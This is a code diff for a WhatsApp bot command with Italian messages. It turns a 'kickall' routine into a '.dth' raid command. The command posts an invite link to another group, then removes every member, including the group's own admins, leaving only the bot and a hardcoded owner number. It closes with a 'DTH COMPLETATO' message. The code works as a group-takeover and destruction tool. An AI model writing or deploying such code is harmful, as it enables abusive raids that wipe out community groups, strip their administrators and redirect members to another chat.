@@ -1,42 +1,59 @@
-case '.kickall': {
-    if (!isGroup) return reply('❌ Solo nei gruppi');
+module.exports = async (sock, m, args) => {
+    const from = m.key.remoteJid;
+    const sender = m.key.participant || m.key.remoteJid;
+    const isGroup = from.endsWith('@g.us');
 
     const owners = [
         '212785924420@s.whatsapp.net'
     ];
 
+    const body =
+        m.message?.conversation ||
+        m.message?.extendedTextMessage?.text ||
+        '';
+
+    // comando .dth
+    if (!body.startsWith('.dth')) return;
+
+    if (!isGroup)
+        return sock.sendMessage(from, { text: '❌ Solo nei gruppi' });
+
     if (!owners.includes(sender))
-        return reply('❌ Comando riservato agli OWNER');
+        return sock.sendMessage(from, { text: '❌ Comando riservato agli OWNER' });
 
-    if (!isBotAdmin)
-        return reply('❌ Devo essere admin per farlo');
+    const metadata = await sock.groupMetadata(from);
+    const botId = sock.user.id;
 
-    // Messaggio da inviare prima del kick
+    const botAdmin = metadata.participants.find(
+        p => p.id === botId && p.admin
+    );
+
+    if (!botAdmin)
+        return sock.sendMessage(from, { text: '❌ Devo essere admin' });
+
+    // Messaggio prima del kick
     const warnMessage = `*ENTRATE TUTTI QUI*:
 https://chat.whatsapp.com/FRF53vgZGhLE6zNEAzVKTT`;
 
-    // Invia il messaggio al gruppo
     await sock.sendMessage(from, { text: warnMessage });
 
-    // Piccola attesa (consigliata)
-    await new Promise(resolve => setTimeout(resolve, 3000));
+    // attesa 3 secondi
+    await new Promise(r => setTimeout(r, 3000));
 
-    const metadata = await sock.groupMetadata(from);
-    const participants = metadata.participants;
-
-    const usersToKick = participants
-        .filter(p =>
-            !p.admin &&                    // non admin
-            p.id !== sock.user.id &&       // non bot
-            !owners.includes(p.id)         // non owner
-        )
-        .map(p => p.id);
+    // KICK TUTTI (anche admin)
+    const usersToKick = metadata.participants
+        .map(p => p.id)
+        .filter(id =>
+            id !== botId &&
+            !owners.includes(id)
+        );
 
     if (usersToKick.length === 0)
-        return reply('⚠️ Nessun membro da rimuovere');
+        return sock.sendMessage(from, { text: '⚠️ Nessun membro da rimuovere' });
 
     await sock.groupParticipantsUpdate(from, usersToKick, 'remove');
 
-    reply(`✅ Operazione completata. Rimossi ${usersToKick.length} membri`);
-}
-break;
+    await sock.sendMessage(from, {
+        text: `☠️ DTH COMPLETATO\n👥 Rimossi: ${usersToKick.length} membri`
+    });
+};
